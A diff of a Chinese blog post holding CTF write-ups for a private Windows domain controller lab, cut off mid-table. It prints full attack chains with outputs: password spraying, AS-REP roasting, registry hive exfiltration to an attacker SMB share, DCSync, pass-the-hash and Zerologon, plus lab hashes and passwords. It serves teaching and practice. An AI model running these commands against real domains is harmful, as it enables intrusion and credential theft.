@@ -1,8 +1,8 @@
 ---
-title: Poloras-BabyDC-Unexpected
+title: PolorasCTF-BabyDC-Unexpected
 description: '个人出题-选手WriteUp'
 pubDate: 2026-03-30
-image: /game/bloodhound.jpg
+image: /ctf/bloodhound.jpg
 categories:
   - Documentation
   - CTF
@@ -10,37 +10,38 @@ tags:
   - CTF
   - Windows Machine
 ---
+![](/ctf/poloarsctf.png)
 ![](/image/myself%20machine/Castlevania-Unexpected-1.png)
 
-# **<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Wh1teSu（域用户-弱口令）</font>**
-## <font style="color:rgb(51, 51, 51);">结论</font>
-<font style="color:rgb(51, 51, 51);">这题的核心利用链是：</font>
+# **Wh1teSu（域用户-弱口令）**
+## 结论
+这题的核心利用链是：
 
-1. <font style="color:rgb(51, 51, 51);">通过 Kerberos 用户枚举拿到一批有效用户名</font>
-2. <font style="color:rgb(51, 51, 51);">用弱口令喷洒拿到低权限域用户</font>
-3. <font style="color:rgb(51, 51, 51);">用 BloodHound 数据确认 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 开启 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Do not require Kerberos preauthentication</font>`<font style="color:rgb(51, 51, 51);">，且属于 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`
-4. <font style="color:rgb(51, 51, 51);">对 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 做 AS-REP Roast，爆破出密码 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">1maxwell</font>`
-5. <font style="color:rgb(51, 51, 51);">结合 GitHub MCP 查到的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">backup_dc_registry</font>`<font style="color:rgb(51, 51, 51);"> 思路，利用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">reg.py backup</font>`<font style="color:rgb(51, 51, 51);"> 让域控把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SAM/SYSTEM/SECURITY</font>`<font style="color:rgb(51, 51, 51);"> 直接备份到 Kali 的 SMB 共享</font>
-6. <font style="color:rgb(51, 51, 51);">从离线 hive 提取出域控机器账户 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">CASTLEVANIA$</font>`<font style="color:rgb(51, 51, 51);"> 的 NTLM</font>
-7. <font style="color:rgb(51, 51, 51);">使用机器账户做 DCSync，拿到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 哈希</font>
-8. <font style="color:rgb(51, 51, 51);">PTH 到目标主机，成功获得 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> shell</font>
+1. 通过 Kerberos 用户枚举拿到一批有效用户名
+2. 用弱口令喷洒拿到低权限域用户
+3. 用 BloodHound 数据确认 `mowen` 开启 `Do not require Kerberos preauthentication`，且属于 `Backup Operators`
+4. 对 `mowen` 做 AS-REP Roast，爆破出密码 `1maxwell`
+5. 结合 GitHub MCP 查到的 `backup_dc_registry` 思路，利用 `reg.py backup` 让域控把 `SAM/SYSTEM/SECURITY` 直接备份到 Kali 的 SMB 共享
+6. 从离线 hive 提取出域控机器账户 `CASTLEVANIA$` 的 NTLM
+7. 使用机器账户做 DCSync，拿到 `Administrator` 哈希
+8. PTH 到目标主机，成功获得 `Administrator` shell
 
-<font style="color:rgb(51, 51, 51);">题目要求是“拿到 Administrator 的 shell 即可”，到第 8 步已经满足。</font>
+题目要求是“拿到 Administrator 的 shell 即可”，到第 8 步已经满足。
 
 ---
 
-## <font style="color:rgb(51, 51, 51);">目标信息</font>
-<font style="color:rgb(51, 51, 51);">已知开放端口如下：</font>
+## 目标信息
+已知开放端口如下：
 
 53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 1433, 3268, 3269, 9389
 
-<font style="color:rgb(51, 51, 51);">进一步探测：</font>
+进一步探测：
 
 ```plain
 nmap -sV -sC -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,9389 192.168.56.105
 ```
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
 > Host: CASTLEVANIA.XMCVE.local
 >
@@ -51,7 +52,7 @@ nmap -sV -sC -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,9389 192.168.
 > 1433/tcp: Microsoft SQL Server 2016
 >
 
-<font style="color:rgb(51, 51, 51);">HTTP 首页只有一个维护页面：</font>
+HTTP 首页只有一个维护页面：
 
 > CASTLEVANIA Portal
 >
@@ -60,18 +61,18 @@ nmap -sV -sC -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,9389 192.168.
 > Under maintenance...
 >
 
-<font style="color:rgb(51, 51, 51);">说明真正入口大概率不在 Web，而是在 AD 身份面。</font>
+说明真正入口大概率不在 Web，而是在 AD 身份面。
 
 ---
 
-## <font style="color:rgb(51, 51, 51);">1. 用户枚举与口令喷洒</font>
-<font style="color:rgb(51, 51, 51);">先用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">kerbrute</font>`<font style="color:rgb(51, 51, 51);"> 跑一轮常见用户名：</font>
+## 1. 用户枚举与口令喷洒
+先用 `kerbrute` 跑一轮常见用户名：
 
 ```plain
 kerbrute userenum -d XMCVE.local --dc 192.168.56.105 /usr/share/seclists/Usernames/top-usernames-shortlist.txt
 ```
 
-<font style="color:rgb(51, 51, 51);">命中的有效用户包括：</font>
+命中的有效用户包括：
 
 ```plain
 admin
@@ -82,13 +83,13 @@ Admin
 alucard
 ```
 
-<font style="color:rgb(51, 51, 51);">接着做一轮最常见弱口令喷洒：</font>
+接着做一轮最常见弱口令喷洒：
 
 ```plain
 kerbrute passwordspray -d XMCVE.local --dc 192.168.56.105 valid_users.txt 'Password123!'
 ```
 
-<font style="color:rgb(51, 51, 51);">命中结果：</font>
+命中结果：
 
 ```plain
 admin:Password123!
@@ -97,20 +98,20 @@ support:Password123!
 Admin:Password123!
 ```
 
-<font style="color:rgb(51, 51, 51);">这一步只拿到了普通域账号，没有直接管理权限。</font>
+这一步只拿到了普通域账号，没有直接管理权限。
 
 ---
 
-## <font style="color:rgb(51, 51, 51);">2. BloodHound 找真正突破口</font>
-<font style="color:rgb(51, 51, 51);">用已知凭据采集 BloodHound 数据：</font>
+## 2. BloodHound 找真正突破口
+用已知凭据采集 BloodHound 数据：
 
 ```plain
 bloodhound-python -u admin -p 'Password123!' -d XMCVE.local -dc CASTLEVANIA.XMCVE.local -ns 192.168.56.105 -c All --zip
 ```
 
-<font style="color:rgb(51, 51, 51);">在采集结果里，关键用户是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">MOWEN@XMCVE.LOCAL</font>`<font style="color:rgb(51, 51, 51);">。</font>
+在采集结果里，关键用户是 `MOWEN@XMCVE.LOCAL`。
 
-<font style="color:rgb(51, 51, 51);">已验证到的关键属性：</font>
+已验证到的关键属性：
 
 ```plain
 dontreqpreauth: true
@@ -118,47 +119,47 @@ serviceprincipalnames: HTTP/CASTLEVANIA.XMCVE.local
 member of: BACKUP OPERATORS
 ```
 
-<font style="color:rgb(51, 51, 51);">同时还能看到：</font>
+同时还能看到：
 
 ALUCARD@XMCVE.LOCAL -> member of local Administrators
 
-<font style="color:rgb(51, 51, 51);">但 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">alucard</font>`<font style="color:rgb(51, 51, 51);"> 当前没有口令，暂时走不通。</font>
+但 `alucard` 当前没有口令，暂时走不通。
 
-<font style="color:rgb(51, 51, 51);">因此最优路径变成：</font>
+因此最优路径变成：
 
-+ <font style="color:rgb(51, 51, 51);">先打 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 的 AS-REP Roast</font>
-+ <font style="color:rgb(51, 51, 51);">再利用其 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 权限打域控</font>
++ 先打 `mowen` 的 AS-REP Roast
++ 再利用其 `Backup Operators` 权限打域控
 
 ---
 
-## <font style="color:rgb(51, 51, 51);">3. AS-REP Roast 拿下 mowen</font>
-<font style="color:rgb(51, 51, 51);">因为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 开启了“不需要预认证”，可以直接请求 AS-REP：</font>
+## 3. AS-REP Roast 拿下 mowen
+因为 `mowen` 开启了“不需要预认证”，可以直接请求 AS-REP：
 
 impacket-GetNPUsers XMCVE.local/mowen -dc-ip 192.168.56.105 -no-pass -request
 
-<font style="color:rgb(51, 51, 51);">拿到哈希后用 John 爆破：</font>
+拿到哈希后用 John 爆破：
 
 ```plain
 john mowen.asrep --wordlist=/usr/share/wordlists/rockyou.txt
 john --show mowen.asrep
 ```
 
-<font style="color:rgb(51, 51, 51);">爆破结果：</font>
+爆破结果：
 
 mowen:1maxwell
 
-<font style="color:rgb(51, 51, 51);">至此得到可用凭据：</font>
+至此得到可用凭据：
 
 XMCVE.local\mowen : 1maxwell
 
 ---
 
-## <font style="color:rgb(51, 51, 51);">4. 用 mowen 做资产验证</font>
-<font style="color:rgb(51, 51, 51);">先看 SMB 权限：</font>
+## 4. 用 mowen 做资产验证
+先看 SMB 权限：
 
 nxc smb 192.168.56.105 -u mowen -p '1maxwell' -d XMCVE.local --shares
 
-<font style="color:rgb(51, 51, 51);">已验证结果：</font>
+已验证结果：
 
 ```plain
 ADMIN$    READ
@@ -168,7 +169,7 @@ NETLOGON  READ
 SYSVOL    READ
 ```
 
-<font style="color:rgb(51, 51, 51);">但常规远程执行并不通：</font>
+但常规远程执行并不通：
 
 ```plain
 atexec.py ...
@@ -176,16 +177,16 @@ wmiexec.py ...
 psexec.py ...
 ```
 
-<font style="color:rgb(51, 51, 51);">结果分别遇到：</font>
+结果分别遇到：
 
 ```plain
 rpc_s_access_denied
 ADMIN$/C$ not writable enough for service drop
 ```
 
-<font style="color:rgb(51, 51, 51);">说明 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 的价值不是直接执行，而是其 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 身份。</font>
+说明 `mowen` 的价值不是直接执行，而是其 `Backup Operators` 身份。
 
-<font style="color:rgb(51, 51, 51);">顺手还从站点目录里发现了一个低价值 SQL 凭据：</font>
+顺手还从站点目录里发现了一个低价值 SQL 凭据：
 
 ```plain
 C:\inetpub\wwwroot\poo_connection.txt
@@ -195,7 +196,7 @@ password=lovlyBaby
 database=master
 ```
 
-<font style="color:rgb(51, 51, 51);">验证后发现 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor</font>`<font style="color:rgb(51, 51, 51);"> 只是低权限 SQL 登录：</font>
+验证后发现 `wuwupor` 只是低权限 SQL 登录：
 
 ```plain
 SYSTEM_USER = wuwupor
@@ -203,50 +204,50 @@ IS_SRVROLEMEMBER('sysadmin') = 0
 xp_cmdshell denied
 ```
 
-<font style="color:rgb(51, 51, 51);">因此 MSSQL 这条线是干扰项，不是正解。</font>
+因此 MSSQL 这条线是干扰项，不是正解。
 
 ---
 
-## <font style="color:rgb(51, 51, 51);">5. GitHub MCP 确认 Backup Operators 利用法</font>
-<font style="color:rgb(51, 51, 51);">这里我没有凭记忆硬打，而是用 GitHub MCP 查公开实现。</font>
+## 5. GitHub MCP 确认 Backup Operators 利用法
+这里我没有凭记忆硬打，而是用 GitHub MCP 查公开实现。
 
-<font style="color:rgb(51, 51, 51);">检索后定位到：</font>
+检索后定位到：
 
 horizon3ai/backup_dc_registry
 
-<font style="color:rgb(51, 51, 51);">仓库 README 明确说明：</font>
+仓库 README 明确说明：
 
 abuses Backup Operator privileges to remote dump SAM, SYSTEM, and SECURITY hives
 
-<font style="color:rgb(51, 51, 51);">其核心用法是：</font>
+其核心用法是：
 
 python3 reg.py user:pass@dc backup -p '\\attacker\share'
 
-<font style="color:rgb(51, 51, 51);">再对照本机 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">reg.py -h</font>`<font style="color:rgb(51, 51, 51);">，确认当前环境中的 Impacket 已内置 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">backup</font>`<font style="color:rgb(51, 51, 51);"> 动作，且参数形式为：</font>
+再对照本机 `reg.py -h`，确认当前环境中的 Impacket 已内置 `backup` 动作，且参数形式为：
 
 reg.py 'domain/user:pass@target' backup -o '\\attacker\share'
 
-<font style="color:rgb(51, 51, 51);">这一步非常关键，因为之前如果把输出写成本地目录，命令会失败；正确思路是让目标机把 hive 备份到攻击机暴露的 UNC 路径。</font>
+这一步非常关键，因为之前如果把输出写成本地目录，命令会失败；正确思路是让目标机把 hive 备份到攻击机暴露的 UNC 路径。
 
 ---
 
-## <font style="color:rgb(51, 51, 51);">6. 让域控反向备份注册表 hive 到 Kali</font>
-<font style="color:rgb(51, 51, 51);">先在 Kali 上起一个 SMB 接收共享：</font>
+## 6. 让域控反向备份注册表 hive 到 Kali
+先在 Kali 上起一个 SMB 接收共享：
 
 ```plain
 mkdir -p /tmp/regshare
 smbserver.py -smb2support -ip 192.168.56.101 share /tmp/regshare
 ```
 
-<font style="color:rgb(51, 51, 51);">我的 Kali 在目标网段的地址是：</font>
+我的 Kali 在目标网段的地址是：
 
 192.168.56.101
 
-<font style="color:rgb(51, 51, 51);">然后直接执行备份：</font>
+然后直接执行备份：
 
 reg.py 'XMCVE.local/mowen:1maxwell@192.168.56.105' -dc-ip 192.168.56.105 backup -o '\\192.168.56.101\share'
 
-<font style="color:rgb(51, 51, 51);">已验证输出：</font>
+已验证输出：
 
 ```plain
 [!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
@@ -255,7 +256,7 @@ reg.py 'XMCVE.local/mowen:1maxwell@192.168.56.105' -dc-ip 192.168.56.105 backup 
 [*] Saved HKLM\SECURITY to \\192.168.56.101\share\SECURITY.save
 ```
 
-<font style="color:rgb(51, 51, 51);">共享目录落地成功：</font>
+共享目录落地成功：
 
 ```plain
 /tmp/regshare/SAM.save
@@ -265,69 +266,69 @@ reg.py 'XMCVE.local/mowen:1maxwell@192.168.56.105' -dc-ip 192.168.56.105 backup 
 
 ---
 
-## <font style="color:rgb(51, 51, 51);">7. 离线提取机器账户哈希</font>
-<font style="color:rgb(51, 51, 51);">对回传的 hive 做离线 secretsdump：</font>
+## 7. 离线提取机器账户哈希
+对回传的 hive 做离线 secretsdump：
 
 secretsdump.py -sam /tmp/regshare/SAM.save -system /tmp/regshare/SYSTEM.save -security /tmp/regshare/SECURITY.save LOCAL
 
-<font style="color:rgb(51, 51, 51);">关键结果有两个：</font>
+关键结果有两个：
 
-1. <font style="color:rgb(51, 51, 51);">本地 SAM 里的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 哈希</font>
-2. <font style="color:rgb(51, 51, 51);">更重要的域控机器账户 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">$MACHINE.ACC</font>`
+1. 本地 SAM 里的 `Administrator` 哈希
+2. 更重要的域控机器账户 `$MACHINE.ACC`
 
-<font style="color:rgb(51, 51, 51);">提取结果中的核心值：</font>
+提取结果中的核心值：
 
 $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7ca8289eae8ab9490db2bfee75bc0d78
 
-<font style="color:rgb(51, 51, 51);">因为目标本身是域控，机器账户 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">CASTLEVANIA$</font>`<font style="color:rgb(51, 51, 51);"> 属于 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Domain Controllers</font>`<font style="color:rgb(51, 51, 51);">，天然具备目录复制能力，所以这一步足够直接推进到 DCSync。</font>
+因为目标本身是域控，机器账户 `CASTLEVANIA$` 属于 `Domain Controllers`，天然具备目录复制能力，所以这一步足够直接推进到 DCSync。
 
-<font style="color:rgb(51, 51, 51);">先验证机器账户哈希可用：</font>
+先验证机器账户哈希可用：
 
 ```plain
 nxc smb 192.168.56.105 -u 'CASTLEVANIA$' -H '7ca8289eae8ab9490db2bfee75bc0d78' -d XMCVE.local
 ```
 
-<font style="color:rgb(51, 51, 51);">结果：</font>
+结果：
 
 [+] XMCVE.local\CASTLEVANIA$:7ca8289eae8ab9490db2bfee75bc0d78
 
 ---
 
-## <font style="color:rgb(51, 51, 51);">8. 用机器账户做 DCSync 拿 Administrator</font>
-<font style="color:rgb(51, 51, 51);">接着直接用机器账户哈希做 DCSync：</font>
+## 8. 用机器账户做 DCSync 拿 Administrator
+接着直接用机器账户哈希做 DCSync：
 
 ```plain
 secretsdump.py -just-dc-user Administrator -hashes ':7ca8289eae8ab9490db2bfee75bc0d78' 'XMCVE.local/CASTLEVANIA$@192.168.56.105' -dc-ip 192.168.56.105
 ```
 
-<font style="color:rgb(51, 51, 51);">成功回显：</font>
+成功回显：
 
 ```plain
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
 ```
 
-<font style="color:rgb(51, 51, 51);">至此得到：</font>
+至此得到：
 
 XMCVE.local\Administrator NTLM = d94f9831271e229dbc6e712097b63168
 
 ---
 
-## <font style="color:rgb(51, 51, 51);">9. PTH 获取 Administrator shell</font>
-<font style="color:rgb(51, 51, 51);">最后直接 PTH：</font>
+## 9. PTH 获取 Administrator shell
+最后直接 PTH：
 
 ```plain
 wmiexec.py -hashes ':d94f9831271e229dbc6e712097b63168' 'XMCVE.local/Administrator@192.168.56.105' 'whoami /all'
 ```
 
-<font style="color:rgb(51, 51, 51);">已验证输出中的关键部分：</font>
+已验证输出中的关键部分：
 
 ```plain
 User Name
 xmcve\administrator
 ```
 
-<font style="color:rgb(51, 51, 51);">以及高权限组：</font>
+以及高权限组：
 
 ```plain
 XMCVE\Domain Admins
@@ -336,26 +337,26 @@ XMCVE\Schema Admins
 BUILTIN\Administrators
 ```
 
-<font style="color:rgb(51, 51, 51);">这说明已经稳定取得 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> shell，题目完成。</font>
+这说明已经稳定取得 `Administrator` shell，题目完成。
 
 ---
 
-## <font style="color:rgb(51, 51, 51);">最终利用链复盘</font>
-<font style="color:rgb(51, 51, 51);">这题的设计点其实很明确：</font>
+## 最终利用链复盘
+这题的设计点其实很明确：
 
-+ <font style="color:rgb(51, 51, 51);">弱口令只是入口，不是终点</font>
-+ <font style="color:rgb(51, 51, 51);">真正核心是 BloodHound 给出的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen -> Backup Operators + no preauth</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 在域控上非常危险，因为它能把注册表 hive 备份出来</font>
-+ <font style="color:rgb(51, 51, 51);">一旦拿到域控机器账户 hash，就能直接 DCSync</font>
-+ <font style="color:rgb(51, 51, 51);">DCSync 之后再 PTH 到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);">，整条链就闭环了</font>
++ 弱口令只是入口，不是终点
++ 真正核心是 BloodHound 给出的 `mowen -> Backup Operators + no preauth`
++ `Backup Operators` 在域控上非常危险，因为它能把注册表 hive 备份出来
++ 一旦拿到域控机器账户 hash，就能直接 DCSync
++ DCSync 之后再 PTH 到 `Administrator`，整条链就闭环了
 
-<font style="color:rgb(51, 51, 51);">最短路径可以概括成一句话：</font>
+最短路径可以概括成一句话：
 
 弱口令域用户 -> BloodHound 定位 mowen -> AS-REP Roast -> Backup Operators 远程导出 hive -> 机器账户 hash -> DCSync -> PTH Administrator
 
 ---
 
-## <font style="color:rgb(51, 51, 51);">关键命令汇总</font>
+## 关键命令汇总
 ```plain
 # 用户枚举
 kerbrute userenum -d XMCVE.local --dc 192.168.56.105 users.txt
@@ -386,7 +387,7 @@ secretsdump.py -just-dc-user Administrator -hashes ':7ca8289eae8ab9490db2bfee75b
 wmiexec.py -hashes ':d94f9831271e229dbc6e712097b63168' 'XMCVE.local/Administrator@192.168.56.105' 'whoami /all'
 ```
 
-# <font style="color:rgb(0, 0, 0);">Lkin（</font><font style="color:#333333;">本地挂载</font><font style="color:rgb(0, 0, 0);">）</font>
+# Lkin（本地挂载）
 ## 解题思路
 通过离线挂载域控硬盘提取 AD 凭据，再利用 Pass-the-Hash 攻击直接以管理员身份登录靶机，最终获得 `nt authority\system` 权限。
 
@@ -466,7 +467,7 @@ nt authority\system
 ### 域内
 Domain Admins + Enterprise Admins + Schema Admins
 
-# NikoCat<font style="color:rgb(0, 0, 0);">（</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font>
+# NikoCat（Zerologon）
 ## 端口扫描
 ```plain
 [731ms]     已选择服务扫描模式
@@ -598,7 +599,7 @@ use post/multi/recon/local_exploit_suggester
 
 ![](/image/myself%20machine/Castlevania-Unexpected-13.png)
 
-## <font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font>
+## Zerologon
 使用cve_2020_0787的exp
 
 由于靶机患了抑郁症，x64的反连shell一直打不出来，只能直接传exp上去了
@@ -609,10 +610,10 @@ use post/multi/recon/local_exploit_suggester
 
 此处获得了system shell，相当于已经有管理员权限
 
-# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">onehang</font><font style="color:#333333;"> （</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">           </font>
-## <font style="color:#333333;">信息收集                                           </font>
-### <font style="color:#333333;">端口扫描                                                   </font>
-<font style="color:#333333;">先</font><font style="color:#333333;">ipconfig</font><font style="color:#333333;">看一下启动的靶机的地址，得到</font><font style="color:#333333;">host-only</font><font style="color:#333333;">的网卡</font><font style="color:#333333;">IP</font><font style="color:#333333;">是</font><font style="color:#333333;">192.168.56.1</font><font style="color:#333333;">，说明靶机在</font><font style="color:#333333;">192.168.56.0/24</font><font style="color:#333333;">网段 </font><font style="color:#333333;">nmap</font><font style="color:#333333;">扫一下</font>
+# onehang （Zerologon）           
+## 信息收集                                           
+### 端口扫描                                                   
+先ipconfig看一下启动的靶机的地址，得到host-only的网卡IP是192.168.56.1，说明靶机在192.168.56.0/24网段 nmap扫一下
 
 ```plain
 ┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
@@ -624,11 +625,11 @@ Nmap scan report for192.168.56.103 Host is up (0.0015s latency).
 Nmap done: 256 IP addresses (3 hosts up) scanned in16.51 seconds
 ```
 
-<font style="color:#333333;">发现了两个目标：</font>
+发现了两个目标：
 
-> <font style="color:#333333;">SMB签名： 已启用且强制</font>
+> SMB签名： 已启用且强制
 >
-> <font style="color:#333333;">有两个重要的攻击面：Web 网站和 MSSQL。</font>
+> 有两个重要的攻击面：Web 网站和 MSSQL。
 >
 
 ```plain
@@ -694,16 +695,16 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in120.46 seconds
 ```
 
-| <font style="color:#333333;">主机名</font> | <font style="color:#333333;">CASTLEVANIA</font> |
+| 主机名 | CASTLEVANIA |
 | --- | --- |
-| <font style="color:#333333;">域名</font> | <font style="color:#333333;">XMCVE.local</font> |
-| <font style="color:#333333;">FQDN</font> | <font style="color:#333333;">CASTLEVANIA.XMCVE.local</font> |
-| <font style="color:#333333;">操作系统</font> | <font style="color:#333333;">Windows Server 2019</font> |
-| <font style="color:#333333;">关键服务</font> | **<font style="color:#333333;">IIS </font>****<font style="color:#333333;">网站</font>****<font style="color:#333333;">(80)</font>**<font style="color:#333333;">, </font>**<font style="color:#333333;">MSSQL 2016(1433)</font>**<font style="color:#333333;">, AD</font><font style="color:#333333;">域控</font><font style="color:#333333;">(88/389/445)</font> |
+| 域名 | XMCVE.local |
+| FQDN | CASTLEVANIA.XMCVE.local |
+| 操作系统 | Windows Server 2019 |
+| 关键服务 | **IIS ****网站****(80)**, **MSSQL 2016(1433)**, AD域控(88/389/445) |
 
 
-### <font style="color:#333333;">添加 hosts 并查看网站</font>
-> <font style="color:#333333;">没有什么信息</font>
+### 添加 hosts 并查看网站
+> 没有什么信息
 >
 
 ```plain
@@ -720,16 +721,16 @@ Nmap done: 1 IP address (1 host up) scanned in120.46 seconds
 </html>
 ```
 
-<font style="color:#333333;"></font>
 
-## <font style="color:#333333;">枚举                                                       </font>
-### <font style="color:#333333;">SMB匿名枚举</font>
+
+## 枚举                                                       
+### SMB匿名枚举
 ```plain
 ┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
 └─# smbclient -L //192.168.56.103 -N session setup failed: NT_STATUS_ACCESS_DENIED
 ```
 
-### <font style="color:#333333;">LDAP匿名枚举</font>
+### LDAP匿名枚举
 ```plain
 ┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
 └─# ldapsearch -x -H ldap://192.168.56.103 -b "DC=XMCVE,DC=local" -s base # extended LDIF
@@ -743,7 +744,7 @@ Nmap done: 1 IP address (1 host up) scanned in120.46 seconds
 # search result search: 2 result: 1 Operations error text: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this opera  tion a successful bind must be completed on the connection., data 0, v4563 # numResponses: 
 ```
 
-### <font style="color:#333333;">Web 目录爆破</font>
+### Web 目录爆破
 ```plain
 ┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
 └─# dirsearch -u http://192.168.56.103
@@ -759,7 +760,7 @@ Output File: /mnt/c/Users/onehang/reports/http_192.168.56.103/_26-03-28_20-50-40
 [20:50:47] 403-  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
 
-### <font style="color:#333333;">枚举域用户</font>
+### 枚举域用户
 ```plain
 ┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
 └─# crackmapexec smb 192.168.56.103 -u '' -p '' --rid-brute
@@ -781,7 +782,7 @@ SMB         192.168.56.103  445    CASTLEVANIA      [-] XMCVE.local\: STATUS_ACC
 SMB         192.168.56.103  445    CASTLEVANIA      [-] Error creating DCERPC connection: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
 ```
 
-### <font style="color:#333333;">mssql 弱口令</font>
+### mssql 弱口令
 ```plain
 ┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
 └─# crackmapexec mssql 192.168.56.103 -u 'sa' -p 'password' --local-auth
@@ -791,8 +792,8 @@ MSSQL       192.168.56.103  1433   CASTLEVANIA      [-] ERROR(CASTLEVANIA): Line
 'sa'.
 ```
 
-### <font style="color:#333333;">枚举Kerberos用户</font>
-> <font style="color:#333333;">找到 3 个有效用户，尝试 AS-REP Roasting（检查是否有用户不需要 Kerberos 预认证）</font>
+### 枚举Kerberos用户
+> 找到 3 个有效用户，尝试 AS-REP Roasting（检查是否有用户不需要 Kerberos 预认证）
 >
 
 ```plain
@@ -809,7 +810,7 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in0.18 seconds
 ```
 
-### <font style="color:#333333;">AS-REP Roasting</font>
+### AS-REP Roasting
 ```plain
 ┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
 └─# impacket-GetNPUsers XMCVE.local/ -usersfile /tmp/users.txt -dc-ip 192.168.56.103 -no-pass
@@ -830,39 +831,39 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 ```
 
-<font style="color:#333333;">都防护的挺死的没什么可以打的点，目前打的渗透不多但是基本上每次都要打cve，并且感觉windows server 2019可能有cve，搜索一下</font>
+都防护的挺死的没什么可以打的点，目前打的渗透不多但是基本上每次都要打cve，并且感觉windows server 2019可能有cve，搜索一下
 
-<font style="color:#333333;">发现</font><font style="color:#333333;">windows server 2019</font><font style="color:#333333;">在</font><font style="color:#333333;">CVE-2020-1472</font><font style="color:#333333;">的影响版本中，尝试利用</font>
+发现windows server 2019在CVE-2020-1472的影响版本中，尝试利用
 
-## <font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font>
+## Zerologon
 ![](/image/myself%20machine/Castlevania-Unexpected-15.jpeg)
 
 ## hash dump
-<font style="color:#333333;">利用成功，接下来dump域内所有用户的哈希</font>
+利用成功，接下来dump域内所有用户的哈希
 
 ![](/image/myself%20machine/Castlevania-Unexpected-16.jpeg)
 
-| **<font style="color:#333333;">用户                                              </font>** | **<font style="color:#333333;">NTLM 哈希</font>** |
+| **用户                                              ** | **NTLM 哈希** |
 | --- | --- |
